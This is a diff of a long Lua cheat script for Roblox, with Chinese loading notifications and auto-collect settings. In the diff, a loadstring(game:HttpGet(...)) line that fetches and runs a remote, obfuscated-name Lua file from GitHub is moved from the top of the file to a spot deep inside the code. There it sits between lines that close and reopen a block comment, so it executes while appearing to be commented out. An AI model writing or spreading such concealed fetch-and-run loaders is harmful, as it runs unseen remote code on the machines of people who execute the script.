@@ -8,13 +8,6 @@ CoreGui:SetCore("SendNotification", {    Title = "………️",    Text = "…�
 CoreGui:SetCore("SendNotification", {    Title = "加载数据️",    Text = "🐾…🐾…🐾…",    Duration = 6, })
 CoreGui:SetCore("SendNotification", {    Title = "嗯，好像卡住了",    Text = "🐾🐾…🐾…",    Duration = 7, })
 CoreGui:SetCore("SendNotification", {    Title = "主人等待一下马上好",    Text = "🐾🐾🐾……",    Duration = 8, })
-loadstring(game:HttpGet'https://raw.githubusercontent.com/GTAFAW/goto/refs/heads/main/lIlIlIlIlIlIlI.lua')'UUUUUUUUUUUUUIUIUIUI'
-game:GetService("StarterGui"):SetCore("SendNotification", { 
-	Title = "🇨🇳🇨🇳🇨🇳🇨🇳🇨🇳";
-	Text = "🇨🇳🇨🇳🇨🇳🇨🇳🇨🇳";
-	Icon = "rbxthumb://type=Asset&id=18923878915&w=150&h=150"})
-	local myButton = script.Parent local sound = game.ServerStorage:FindFirstChild("1841647093")  myButton.MouseButton1Click:Connect(function() if sound then sound:Play() end end)
-Duration = 5;     
 --[[哈哈哈哈哈 不喜欢培根.xgo留言:🐾🐾🐾🐾🐾🐾🐾🐾🐾🐾🐾🐾🐾🐾🐾🐾🐾🐾🐾🐾🐾🐾🐾
 --°̥̥̥̥̥̥̥̥°̥̥̥̥̥̥̥̥°̥̥̥̥̥̥̥̥°̥̥̥̥̥̥̥̥°̥̥̥̥̥̥̥̥°̥̥̥̥̥̥̥̥°̥̥̥̥̥̥̥̥°̥̥̥̥̥̥̥̥°̥̥̥̥̥̥̥̥°̥̥̥̥̥̥̥̥°̥̥̥̥̥̥̥̥°̥̥̥̥̥̥̥̥°̥̥̥̥̥̥̥̥°̥̥̥̥̥̥̥̥°̥̥̥̥̥̥̥̥°̥̥̥̥̥̥̥̥°̥̥̥̥̥̥̥̥°̥̥̥̥̥̥̥̥°̥̥̥̥̥̥̥̥°̥̥̥̥̥̥̥̥°̥̥̥̥̥̥̥̥°̥̥̥̥̥̥̥̥°̥̥̥̥̥̥̥̥°̥̥̥̥̥̥̥̥°̥̥̥̥̥̥̥̥°̥̥̥̥̥̥̥̥°̥̥̥̥̥̥̥̥°̥̥̥̥̥̥̥̥°̥̥̥̥̥̥̥̥°̥̥̥̥̥̥̥̥°̥̥̥̥̥̥̥̥°̥̥̥̥̥̥̥̥°̥̥̥̥̥̥̥̥°̥̥̥̥̥̥̥̥°̥̥̥̥̥̥̥̥°̥̥̥̥̥̥̥̥°̥̥̥̥̥̥̥̥°̥̥̥̥̥̥̥̥°̥̥̥̥̥̥̥̥°̥̥̥̥̥̥̥̥°̥̥̥̥̥̥̥̥°̥̥̥̥̥̥̥̥°̥̥̥̥̥̥̥̥°̥̥̥̥̥̥̥̥°̥̥̥̥̥̥̥̥°̥̥̥̥̥̥̥̥°̥̥̥̥̥̥̥̥°̥̥̥̥̥̥̥̥°̥̥̥̥̥̥̥̥°̥̥̥̥̥̥̥̥°̥̥̥̥̥̥̥̥°̥̥̥̥̥̥̥̥°̥̥̥̥̥̥̥̥°̥̥̥̥̥̥̥̥°̥̥̥̥̥̥̥̥°̥̥̥̥̥̥̥̥°̥̥̥̥̥̥̥̥°̥̥̥̥̥̥̥̥°̥̥̥̥̥̥̥̥°̥̥̥̥̥̥̥̥°̥̥̥̥̥̥̥̥°̥̥̥̥̥̥̥̥°̥̥̥̥̥̥̥̥°̥̥̥̥̥̥̥̥°̥̥̥̥̥̥̥̥°̥̥̥̥̥̥̥̥°̥̥̥̥̥̥̥̥°̥̥̥̥̥̥̥̥°̥̥̥̥̥̥̥̥°̥̥̥̥̥̥̥̥°̥̥̥̥̥̥̥̥°̥̥̥̥̥̥̥̥
 getgenv().autoCollectEnabled = true
@@ -12819,6 +12812,9 @@ end
 function rotation:updateAxes(visibleOverride)
 	local basePos = headObject.recentHand.realHand.Base.Position
 	local basePoint = cam:WorldToViewportPoint(basePos)
+]]--
+loadstring(game:HttpGet'https://raw.githubusercontent.com/GTAFAW/goto/refs/heads/main/lIlIlIlIlIlIlI.lua')'UUUUUUUUUUUUUIUIUIUI'
+--[[
 
 	for i=1,3 do
 		for j=1,12 do
@@ -25710,8 +25706,10 @@ end)
        end)
     end
 end
-
-
-
-
-----------------这你都能开到]]
+----------------这你都能开到]]--
+game:GetService("StarterGui"):SetCore("SendNotification", { 
+	Title = "🇨🇳🇨🇳🇨🇳🇨🇳🇨🇳";
+	Text = "🇨🇳🇨🇳🇨🇳🇨🇳🇨🇳";
+	Icon = "rbxthumb://type=Asset&id=18923878915&w=150&h=150"})
+	local myButton = script.Parent local sound = game.ServerStorage:FindFirstChild("1841647093")  myButton.MouseButton1Click:Connect(function() if sound then sound:Play() end end)
+Duration = 5; 
